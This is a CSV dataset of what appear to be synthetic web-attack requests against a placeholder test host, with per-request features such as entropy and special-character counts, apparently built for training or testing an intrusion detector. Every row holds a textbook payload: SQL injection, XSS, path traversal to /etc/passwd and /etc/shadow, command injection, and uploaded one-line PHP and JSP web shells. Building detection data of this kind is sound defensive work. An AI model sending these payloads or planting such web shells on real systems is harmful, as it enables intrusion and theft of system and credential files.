timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T22:57:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.87,7,1,11,0,302,1350
2025-01-02T22:58:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.02,6,1,21,0,200,878
2025-01-02T22:59:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.23,0,1,2,0,403,735
2025-01-02T23:00:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.57,0,1,6,0,403,447
2025-01-02T23:01:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.22,2,1,11,0,500,611
2025-01-02T23:02:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.51,7,1,33,0,200,953
2025-01-02T23:03:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.34,0,1,2,0,403,1256
2025-01-02T23:04:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.69,3,1,15,0,500,231
2025-01-02T23:05:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.02,3,1,15,0,200,781
2025-01-02T23:06:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.72,3,1,18,0,403,400
2025-01-02T23:07:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.48,10,1,27,0,302,1378
2025-01-02T23:08:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.39,2,1,11,0,403,567
2025-01-02T23:09:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.31,7,1,11,0,403,929
2025-01-02T23:10:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.07,6,1,22,0,200,1301
2025-01-02T23:11:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.46,19,1,55,1,302,1079
2025-01-02T23:12:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.52,3,1,15,0,500,803
2025-01-02T23:13:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.93,7,1,25,0,500,750
2025-01-02T23:14:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.33,13,1,22,0,403,867
2025-01-02T23:15:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.93,7,1,33,0,302,1046
2025-01-02T23:16:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.2,19,1,55,1,500,1524
2025-01-02T23:17:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.3,0,1,2,0,403,631
2025-01-02T23:18:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.68,1,1,3,0,403,1150
2025-01-02T23:19:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.32,3,1,18,0,200,288
2025-01-02T23:20:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.0,7,1,33,0,403,506
2025-01-02T23:21:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.28,0,1,6,0,302,225
2025-01-02T23:22:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.63,3,1,8,0,302,439
2025-01-02T23:23:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.21,7,1,25,0,200,564
2025-01-02T23:24:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.62,10,1,27,0,500,411
2025-01-02T23:25:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.12,13,1,22,0,403,1060
2025-01-02T23:26:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.87,3,1,18,0,302,1349
2025-01-02T23:27:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.83,19,1,55,1,200,384
2025-01-02T23:28:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.12,7,1,33,0,403,1460
2025-01-02T23:29:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.22,7,1,33,0,200,703
2025-01-02T23:30:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.16,0,1,6,0,500,231
2025-01-02T23:31:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.24,0,1,6,0,302,231
2025-01-02T23:32:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.65,3,1,18,0,403,697
2025-01-02T23:33:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.19,3,1,15,0,302,297
2025-01-02T23:34:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.41,19,1,55,1,302,1520
2025-01-02T23:35:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.45,19,1,55,1,500,1435
2025-01-02T23:36:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.05,22,1,85,1,403,768
2025-01-02T23:37:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.67,10,1,27,0,500,1593
2025-01-02T23:38:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.56,0,1,6,0,200,1373
2025-01-02T23:39:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.12,13,1,22,0,302,1326
2025-01-02T23:40:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,6.03,6,1,21,0,200,570
2025-01-02T23:41:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.28,13,1,22,0,302,738
2025-01-02T23:42:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.11,13,1,22,0,302,1087
2025-01-02T23:43:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.19,3,1,8,0,500,281
2025-01-02T23:44:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.42,7,1,33,0,200,668
2025-01-02T23:45:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.29,22,1,85,1,302,370
2025-01-02T23:46:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.33,13,1,22,0,500,494
2025-01-02T23:47:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.98,3,1,18,0,200,400
2025-01-02T23:48:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.16,22,1,85,1,500,1574
2025-01-02T23:49:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.07,22,1,85,1,302,851
2025-01-02T23:50:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.8,0,1,2,0,500,1257
2025-01-02T23:51:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.91,3,1,8,0,500,1179
2025-01-02T23:52:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.44,6,1,22,0,500,973
2025-01-02T23:53:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.3,3,1,18,0,302,608
2025-01-02T23:54:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.51,2,1,11,0,500,736
2025-01-02T23:55:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.59,22,1,85,1,200,1043
2025-01-02T23:56:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.0,22,1,85,1,302,432
2025-01-02T23:57:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.81,6,1,21,0,200,532
2025-01-02T23:58:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.11,7,1,19,0,200,1338
2025-01-02T23:59:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.09,22,1,85,1,200,992
2025-01-03T00:00:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.81,7,1,33,0,403,1099
2025-01-03T00:01:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.88,1,1,3,0,500,598
2025-01-03T00:02:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.85,6,1,22,0,500,979
2025-01-03T00:03:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.12,22,1,85,1,200,639
2025-01-03T00:04:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.72,10,1,27,0,403,438
2025-01-03T00:05:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.56,8,1,28,0,302,392
2025-01-03T00:06:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.26,3,1,8,0,200,486
2025-01-03T00:07:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.99,1,1,3,0,403,768
2025-01-03T00:08:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.86,6,1,21,0,302,1233
2025-01-03T00:09:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.39,10,1,27,0,302,1099
2025-01-03T00:10:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.17,0,1,6,0,200,889
2025-01-03T00:11:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.43,22,1,85,1,403,1041
2025-01-03T00:12:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.75,1,1,3,0,302,1451
2025-01-03T00:13:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,6.21,6,1,22,0,403,1597
2025-01-03T00:14:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.89,19,1,55,1,403,1214
2025-01-03T00:15:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.93,8,1,28,0,403,266
2025-01-03T00:16:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.96,10,1,27,0,500,354
2025-01-03T00:17:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.9,6,1,22,0,403,642
2025-01-03T00:18:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.0,7,1,33,0,200,859
2025-01-03T00:19:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.7,19,1,55,1,302,1158
2025-01-03T00:20:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.23,7,1,19,0,403,734
2025-01-03T00:21:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.49,7,1,33,0,500,363
2025-01-03T00:22:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.54,10,1,27,0,403,428
2025-01-03T00:23:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.63,3,1,18,0,403,851
2025-01-03T00:24:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.25,8,1,28,0,302,213
2025-01-03T00:25:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.77,10,1,27,0,200,357
2025-01-03T00:26:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.88,10,1,27,0,403,662
2025-01-03T00:27:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.81,6,1,22,0,403,511
2025-01-03T00:28:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.74,3,1,8,0,302,1045
2025-01-03T00:29:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.08,7,1,25,0,302,1333
2025-01-03T00:30:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.8,0,1,6,0,200,327
2025-01-03T00:31:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.15,0,1,2,0,302,1358
2025-01-03T00:32:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.69,2,1,11,0,302,1122
2025-01-03T00:33:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.7,7,1,33,0,302,351
2025-01-03T00:34:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.3,7,1,25,0,500,761
2025-01-03T00:35:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.71,7,1,19,0,403,917
2025-01-03T00:36:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.06,10,1,27,0,403,270
2025-01-03T00:37:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.68,7,1,33,0,200,1199
2025-01-03T00:38:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.6,0,1,6,0,200,889
2025-01-03T00:39:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,6.45,6,1,21,0,200,446
2025-01-03T00:40:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.37,8,1,28,0,200,1356
2025-01-03T00:41:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.1,6,1,21,0,500,590
2025-01-03T00:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.61,22,1,85,1,302,778
2025-01-03T00:43:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.76,3,1,15,0,403,580
2025-01-03T00:44:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.99,3,1,15,0,302,1564
2025-01-03T00:45:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.33,22,1,85,1,200,1054
2025-01-03T00:46:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.18,7,1,11,0,500,881
2025-01-03T00:47:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.35,8,1,28,0,302,722
2025-01-03T00:48:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.87,7,1,11,0,302,1162
2025-01-03T00:49:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.91,0,1,2,0,500,313
2025-01-03T00:50:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.78,13,1,22,0,500,1518
2025-01-03T00:51:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.55,6,1,21,0,403,1337
2025-01-03T00:52:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,6.24,6,1,21,0,200,965
2025-01-03T00:53:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.91,6,1,22,0,302,1351
2025-01-03T00:54:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.36,3,1,8,0,302,345
2025-01-03T00:55:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.19,7,1,11,0,500,834
2025-01-03T00:56:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.02,7,1,25,0,302,372
2025-01-03T00:57:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.36,10,1,27,0,302,1551
2025-01-03T00:58:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.45,7,1,25,0,500,1464
2025-01-03T00:59:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.75,7,1,25,0,403,741
2025-01-03T01:00:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.23,2,1,11,0,302,972
2025-01-03T01:01:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.12,3,1,8,0,403,531
2025-01-03T01:02:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.04,3,1,18,0,500,1078
2025-01-03T01:03:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.62,7,1,33,0,302,1408
2025-01-03T01:04:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.14,7,1,25,0,302,1392
2025-01-03T01:05:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.5,7,1,25,0,403,673
2025-01-03T01:06:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.53,6,1,21,0,302,1273
2025-01-03T01:07:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.66,13,1,22,0,403,269
2025-01-03T01:08:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.55,3,1,8,0,403,1049
2025-01-03T01:09:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.62,6,1,21,0,500,1047
2025-01-03T01:10:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.15,6,1,22,0,403,561
2025-01-03T01:11:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.51,19,1,55,1,302,735
2025-01-03T01:12:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.88,22,1,85,1,302,1371
2025-01-03T01:13:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,3.67,2,1,11,0,200,1146
2025-01-03T01:14:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.07,19,1,55,1,302,1567
2025-01-03T01:15:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,6.43,6,1,21,0,200,1280
2025-01-03T01:16:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.07,19,1,55,1,200,1559
2025-01-03T01:17:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.26,7,1,33,0,500,1230
2025-01-03T01:18:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.68,10,1,27,0,200,611
2025-01-03T01:19:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.88,6,1,22,0,403,887
2025-01-03T01:20:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.13,7,1,25,0,302,1316
2025-01-03T01:21:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.59,6,1,21,0,403,317
2025-01-03T01:22:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.19,0,1,2,0,500,1099
2025-01-03T01:23:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.89,22,1,85,1,500,774
2025-01-03T01:24:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.77,1,1,3,0,500,1577
2025-01-03T01:25:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.85,0,1,2,0,403,496
2025-01-03T01:26:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.51,6,1,22,0,403,1387
2025-01-03T01:27:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.69,22,1,85,1,500,723
